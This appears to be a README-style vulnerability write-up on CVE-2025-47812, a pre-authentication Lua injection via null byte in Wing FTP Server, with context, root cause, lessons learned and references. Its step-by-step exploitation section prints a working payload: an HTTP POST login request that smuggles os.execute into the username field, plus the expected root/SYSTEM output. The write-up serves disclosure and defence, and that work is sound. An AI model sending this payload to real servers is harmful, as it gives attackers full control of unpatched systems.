# CVE-2025-47812 — Wing FTP Server Null-Byte & Lua Injection (RCE)

### Overview
- **CVE ID:** CVE-2025-47812  
- **Published:** June 30, 2025  
- **Severity (CVSS):** 9.8 (Critical)  
- **Affected Software/Versions:** Wing FTP Server (all platforms, versions **before 7.4.4**)  
- **Vulnerability Type:** Null-byte injection + Lua code injection leading to Remote Code Execution (RCE)  

**Summary:**  
A flaw in how **Wing FTP Server processes null bytes in username input** during authentication allows attackers to inject arbitrary **Lua code**.  
This enables an **unauthenticated, remote attacker** to execute arbitrary OS commands as **SYSTEM (Windows)** or **root (Linux/Unix)**.  

Because the exploit is **pre-authentication and trivial to trigger**, this is considered **Critical (RCE)** and has been observed in **active exploitation campaigns**.

---

### Context
To understand the impact, it’s key to examine **how Wing FTP handles authentication** and why this bug is so dangerous:

- **Wing FTP Server** is a widely used cross-platform managed file transfer solution.  
- During authentication, **username values are parsed and stored** in temporary session files.  
- The server incorrectly processes **null-byte (`%00`) characters** inside username values.  
- **The Problem:** Attackers can append **Lua code after the null byte**, which is then passed into the Lua interpreter running inside Wing FTP.  
- **The Result:** The injected code executes on the server with **full privileges**.  

This turns a simple login attempt into **unauthenticated remote code execution**.

---

### Root Cause
The vulnerability comes down to **unsafe input handling**:

- The authentication routine **does not properly sanitize null bytes** in input.  
- After truncation at the null byte, the **rest of the attacker-controlled payload is still parsed**.  
- Because Wing FTP embeds **Lua scripting**, the malicious payload is interpreted as Lua code.  
- The combination of **null-byte truncation + embedded scripting** = full RCE.

---

### Exploitation (Step-by-Step)

#### 1. Locate the Login Endpoint
The attacker connects to the Wing FTP Server login page or endpoint (commonly on port 5466 for the web admin console):
```
https://victim-ftp.local:5466/admin_login.html
```

#### 2. Craft the Malicious Payload
The attacker prepares a username containing a null byte followed by Lua code.  
Example payload (educational only):
```
Username: validuser%00; os.execute("whoami")
Password: anything
```

#### 3. Send the Request
A crafted HTTP POST login request may look like:
```http
POST /admin_login.html HTTP/1.1
Host: victim-ftp.local:5466
Content-Type: application/x-www-form-urlencoded

username=admin%00;os.execute('whoami')&password=test
```

#### 4. Observe Execution
The null byte truncates normal parsing, but the injected `os.execute()` Lua code is run inside the server.  
Typical response or logged output might show:
```
nt authority\system
```
on Windows, or
```
root
```
on Linux.

This confirms **remote code execution** with the highest system privileges.

---

### Post Exploitation
Once code execution is achieved, attackers can:

* Deploy **web shells** or reverse shells for persistence.  
* Create or replace FTP accounts for backdoor access.  
* Exfiltrate sensitive files directly from the FTP repository.  
* Move laterally across the enterprise environment.  

Huntress and others reported **real-world attacks** using this exploit to drop Lua-based backdoors.  
Rapid7 also released a **Metasploit module** for controlled testing:  
`exploit/multi/http/wingftp_null_byte_rce`

---

### Proof of Concept

A **minimal educational PoC** was published by security researcher **Julien Ahrens** and later adapted by Huntress Labs. [`poc/exploit.py`](poc/exploit.py) poc credit goes to https://github.com/0xcan1337/CVE-2025-47812-poC/

The PoC demonstrates:  
- Injecting a null byte into the username field.  
- Executing attacker-controlled Lua commands.  
- Confirming arbitrary command execution (e.g., `whoami`).  

⚠️ Note: PoCs should only be used in controlled lab/test environments.

---

### Lessons Learned

1. **Null-byte injection is still alive.** Old tricks like `%00` can still break modern code if not handled securely.  
2. **Embedded interpreters are risky.** Allowing user-controlled input to reach Lua, Python, or JavaScript engines is dangerous.  
3. **Pre-auth RCE = maximum severity.** Bugs before authentication expose the system to the internet with no barrier.  
4. **Patch quickly.** Exploits were seen in the wild within days of disclosure.  
5. **Defense-in-depth matters.** Web admin panels should not be exposed directly to the internet without network-level protections.  

---

### References

* [Huntress Blog — Wing FTP Server RCE exploited in the wild (CVE-2025-47812)](https://www.huntress.com/blog/wing-ftp-server-remote-code-execution-cve-2025-47812-exploited-in-wild)  
* [HelpNetSecurity — Critical Wing FTP flaw exploited (CVE-2025-47812)](https://www.helpnetsecurity.com/2025/07/11/critical-wing-ftp-server-vulnerability-exploited-in-the-wild-cve-2025-47812/)  
* [SecPod Blog — Active exploitation of Wing FTP CVE-2025-47812](https://www.secpod.com/blog/wing-ftp-under-siege-critical-vulnerability-actively-exploited/)  
* [Metasploit Module: exploit/multi/http/wingftp_null_byte_rce](https://www.rapid7.com/db/modules/exploit/multi/http/wingftp_null_byte_rce/)  
* [Vendor Advisory — Wing FTP Server v7.4.4 Release Notes](https://www.wftpserver.com/serverhistory.htm)  
* [CVE Entry — CVE-2025-47812 (MITRE)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47812)  
* [NVD Entry — CVE-2025-47812](https://nvd.nist.gov/vuln/detail/CVE-2025-47812)  
